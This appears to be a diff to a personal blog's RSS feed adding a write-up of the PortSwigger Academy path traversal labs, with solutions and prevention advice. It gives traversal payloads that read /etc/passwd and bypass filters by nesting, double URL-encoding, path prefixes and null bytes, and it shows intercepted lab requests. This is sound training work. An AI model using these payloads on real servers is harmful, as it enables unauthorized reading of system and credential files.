@@ -1,4 +1,154 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>.:: Alan Cortez</title><description>Personal Site</description><link>https://alan.com.ar/</link><language>en</language><item><title>PortSwigger Academy - Server-side vulnerabilities (Part 2).</title><link>https://alan.com.ar/posts/portswiggeracademyp2/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademyp2/</guid><pubDate>Wed, 02 Jul 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>.:: Alan Cortez</title><description>Personal Site</description><link>https://alan.com.ar/</link><language>en</language><item><title>PortSwigger Academy - Path traversal.</title><link>https://alan.com.ar/posts/portswiggeracademypathtraversal/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademypathtraversal/</guid><pubDate>Wed, 09 Jul 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
+&lt;p&gt;https://portswigger.net/web-security/learning-paths/path-traversal&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This learning path covers path traversal vulnerabilities. You&apos;ll learn how to carry out path traversal attacks and circumvent common obstacles. You&apos;ll also learn how to prevent path traversal attacks.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;What is path traversal?&lt;/h3&gt;
+&lt;p&gt;Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. This might include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Application code and data.&lt;/li&gt;
+&lt;li&gt;Credentials for back-end systems.&lt;/li&gt;
+&lt;li&gt;Sensitive operating system files.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.&lt;/p&gt;
+&lt;h3&gt;Reading arbitrary files via path traversal&lt;/h3&gt;
+&lt;p&gt;Imagine a shopping application that displays images of items for sale. This might load an image using the following HTML:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;img src=&quot;/loadImage?filename=218.png&quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;loadImage&lt;/code&gt; URL takes a &lt;code&gt;filename&lt;/code&gt; parameter and returns the contents of the specified file. The image files are stored on disk in the location &lt;code&gt;/var/www/images/&lt;/code&gt;. To return an image, the application appends the requested filename to this base directory and uses a filesystem API to read the contents of the file. In other words, the application reads from the following file path:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/var/www/images/218.png&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This application implements no defenses against path traversal attacks. As a result, an attacker can request the following URL to retrieve the &lt;code&gt;/etc/passwd&lt;/code&gt; file from the server&apos;s filesystem:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://insecure-website.com/loadImage?filename=../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This causes the application to read from the following file path:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/var/www/images/../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The sequence &lt;code&gt;../&lt;/code&gt; is valid within a file path, and means to step up one level in the directory structure. The three consecutive &lt;code&gt;../&lt;/code&gt; sequences step up from &lt;code&gt;/var/www/images/&lt;/code&gt; to the filesystem root, and so the file that is actually read is:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;On Unix-based operating systems, this is a standard file containing details of the users that are registered on the server, but an attacker could retrieve other arbitrary files using the same technique.&lt;/p&gt;
+&lt;p&gt;On Windows, both &lt;code&gt;../&lt;/code&gt; and &lt;code&gt;..\&lt;/code&gt; are valid directory traversal sequences. The following is an example of an equivalent attack against a Windows-based server:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini&lt;/code&gt;&lt;/p&gt;
+&lt;h4&gt;LAB: File path traversal, simple case&lt;/h4&gt;
+&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images. To solve the lab, retrieve the contents of the /etc/passwd file.&lt;/p&gt;
+&lt;h4&gt;Solution&lt;/h4&gt;
+&lt;p&gt;To solve this, I started by right-clicking an image to grab its source URL. That gave me something like:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0aaf00eb033990da81ca5247006800a9.web-security-academy.net/image?filename=8.jpg&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Then, I just kept adding ../ to the filename parameter a few times until I found the directory I was looking for.&lt;/p&gt;
+&lt;p&gt;The solution ended up being:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://0aaf00eb033990da81ca5247006800a9.web-security-academy.net/image?filename=../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities&lt;/h3&gt;
+&lt;p&gt;Many applications that place user input into file paths implement defenses against path traversal attacks. These can often be bypassed.&lt;/p&gt;
+&lt;p&gt;If an application strips or blocks directory traversal sequences from the user-supplied filename, it might be possible to bypass the defense using a variety of techniques.&lt;/p&gt;
+&lt;p&gt;You might be able to use an absolute path from the filesystem root, such as &lt;code&gt;filename=/etc/passwd&lt;/code&gt;, to directly reference a file without using any traversal sequences.&lt;/p&gt;
+&lt;h4&gt;Lab: File path traversal, traversal sequences blocked with absolute path bypass&lt;/h4&gt;
+&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
+&lt;p&gt;The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.&lt;/p&gt;
+&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;h4&gt;Solution&lt;/h4&gt;
+&lt;p&gt;We intercept the request&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /image?filename=5.jpg HTTP/2
+Host: 0aa500d104625ca68276601f00de0098.web-security-academy.net
+Cookie: session=GvEnpHbu8HvC87C9631Fuv2PbCXDjwyX
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Accept-Language: en-GB,en;q=0.9
+Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0aa500d104625ca68276601f00de0098.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: i`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;and change&lt;br /&gt;
+&lt;code&gt;GET /image?filename=5.jpg&lt;/code&gt;&lt;br /&gt;
+for&lt;br /&gt;
+&lt;code&gt;GET /image?filename=/etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities - Continued&lt;/h3&gt;
+&lt;p&gt;You might be able to use nested traversal sequences, such as &lt;code&gt;....//&lt;/code&gt; or &lt;code&gt;....\/&lt;/code&gt;. These revert to simple traversal sequences when the inner sequence is stripped.&lt;/p&gt;
+&lt;h4&gt;Lab: File path traversal, traversal sequences stripped non-recursively&lt;/h4&gt;
+&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
+&lt;p&gt;The application strips path traversal sequences from the user-supplied filename before using it.&lt;/p&gt;
+&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;h4&gt;Solution&lt;/h4&gt;
+&lt;p&gt;Since the lab strips path traversal sequences, using:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;GET /image?filename=../../../etc/passwd HTTP/2
+Host: 0a78008203c6729a829a255500bd0024.web-security-academy.net
+Cookie: session=RoX9uyjy6phuxm1jfFK3AksmsDJ5GQAg
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+Accept-Language: en-GB,en;q=0.9
+Sec-Ch-Ua: &quot;Not)A;Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;138&quot;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a78008203c6729a829a255500bd0024.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=2, i`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;gets us:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 14
+&quot;No such file&quot;`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;What we can do is replace&lt;br /&gt;
+&lt;code&gt;GET /image?filename=../../../etc/passwd HTTP/2&lt;/code&gt;&lt;br /&gt;
+for&lt;br /&gt;
+&lt;code&gt;GET /image?filename=....//....//....//etc/passwd HTTP/2&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities - Continued&lt;/h3&gt;
+&lt;p&gt;In some contexts, such as in a URL path or the &lt;code&gt;filename&lt;/code&gt; parameter of a &lt;code&gt;multipart/form-data&lt;/code&gt; request, web servers may strip any directory traversal sequences before passing your input to the application. You can sometimes bypass this kind of sanitization by URL encoding, or even double URL encoding, the &lt;code&gt;../&lt;/code&gt; characters. This results in &lt;code&gt;%2e%2e%2f&lt;/code&gt; and &lt;code&gt;%252e%252e%252f&lt;/code&gt; respectively. Various non-standard encodings, such as &lt;code&gt;..%c0%af&lt;/code&gt; or &lt;code&gt;..%ef%bc%8f&lt;/code&gt;, may also work.&lt;/p&gt;
+&lt;h4&gt;Lab: File path traversal, traversal sequences stripped with superfluous URL-decode&lt;/h4&gt;
+&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
+&lt;p&gt;The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.&lt;/p&gt;
+&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;h4&gt;Solution&lt;/h4&gt;
+&lt;p&gt;At first I tried:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;GET /image?filename=../../../etc/passwd HTTP/2&lt;/code&gt;&lt;br /&gt;
+and&lt;br /&gt;
+&lt;code&gt;GET /image?filename=....//....//....//etc/passwd HTTP/2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;But we got&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 14
+&quot;No such file&quot;`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Instead we double encode the ../ part:&lt;br /&gt;
+&lt;code&gt;../&lt;/code&gt; --&amp;gt; &lt;code&gt;%2e%2e%2f&lt;/code&gt; --&amp;gt; &lt;code&gt;%252e%252e%252f&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;GET /image?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd HTTP/2&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities - Continued&lt;/h3&gt;
+&lt;p&gt;An application may require the user-supplied filename to start with the expected base folder, such as &lt;code&gt;/var/www/images&lt;/code&gt;. In this case, it might be possible to include the required base folder followed by suitable traversal sequences. For example: &lt;code&gt;filename=/var/www/images/../../../etc/passwd&lt;/code&gt;.&lt;/p&gt;
+&lt;h4&gt;Lab: File path traversal, validation of start of path&lt;/h4&gt;
+&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
+&lt;p&gt;The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.&lt;/p&gt;
+&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;h4&gt;Solution&lt;/h4&gt;
+&lt;p&gt;We replace&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;GET /image?filename=/var/www/images/47.jpg HTTP/2&lt;/code&gt;&lt;br /&gt;
+for&lt;br /&gt;
+&lt;code&gt;GET /image?filename=/var/www/images/../../../etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Common obstacles to exploiting path traversal vulnerabilities - Continued&lt;/h3&gt;
+&lt;p&gt;An application may require the user-supplied filename to end with an expected file extension, such as &lt;code&gt;.png&lt;/code&gt;. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: &lt;code&gt;filename=../../../etc/passwd%00.png&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;Lab: File path traversal, validation of file extension with null byte bypass&lt;/h3&gt;
+&lt;p&gt;This lab contains a path traversal vulnerability in the display of product images.&lt;/p&gt;
+&lt;p&gt;The application validates that the supplied filename ends with the expected file extension.&lt;/p&gt;
+&lt;p&gt;To solve the lab, retrieve the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
+&lt;h4&gt;Solution&lt;/h4&gt;
+&lt;p&gt;We use the null byte trick:
+&lt;code&gt;filename=../../../etc/passwd%00.png&lt;/code&gt;.&lt;/p&gt;
+&lt;h3&gt;How to prevent a path traversal attack&lt;/h3&gt;
+&lt;p&gt;The most effective way to prevent path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.&lt;/p&gt;
+&lt;p&gt;If you can&apos;t avoid passing user-supplied input to filesystem APIs, we recommend using two layers of defense to prevent attacks:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn&apos;t possible, verify that the input contains only permitted content, such as alphanumeric characters only.&lt;/li&gt;
+&lt;li&gt;After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Below is an example of some simple Java code to validate the canonical path of a file based on user input:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;File file = new File(BASE_DIRECTORY, userInput); if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file }&lt;/code&gt;&lt;/p&gt;
+</content:encoded></item><item><title>PortSwigger Academy - Server-side vulnerabilities (Part 2).</title><link>https://alan.com.ar/posts/portswiggeracademyp2/</link><guid isPermaLink="true">https://alan.com.ar/posts/portswiggeracademyp2/</guid><pubDate>Wed, 02 Jul 2025 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
 &lt;p&gt;https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;This learning path introduces you to a range of common server-side vulnerabilities. This is perfect if you&apos;re new to web security and want to get an overview of the kinds of vulnerabilities that exist, as well as how an attacker might identify and exploit them in real-world systems.&lt;/p&gt;
